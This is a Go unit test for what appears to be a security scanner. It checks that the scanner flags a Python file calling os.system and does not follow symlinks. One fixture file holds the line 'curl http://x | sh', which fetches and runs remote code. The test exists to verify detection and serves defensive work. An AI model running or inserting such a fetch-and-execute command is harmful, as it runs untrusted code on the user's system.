package scanners

import (
	"os"
	"path/filepath"
	"testing"

	"aftersec/pkg/core"
)

func TestScanRootsFlagsSourceAndSkipsSymlink(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "bad.py"), []byte("import os\nos.system('id')\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	real := filepath.Join(dir, "real.sh")
	if err := os.WriteFile(real, []byte("curl http://x | sh\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(real, filepath.Join(dir, "alias.sh")); err != nil {
		t.Fatal(err)
	}
	var got []core.Finding
	scanRoots([]string{dir}, func(f core.Finding) { got = append(got, f) })
	var sawPy, sawLink bool
	for _, f := range got {
		if f.Name == "py-os-system" && !f.Passed {
			sawPy = true
		}
		if f.CurrentVal == "alias.sh" {
			sawLink = true
		}
	}
	if !sawPy {
		t.Fatalf("source finding missing: %#v", got)
	}
	if sawLink {
		t.Fatal("followed a symlink")
	}
}
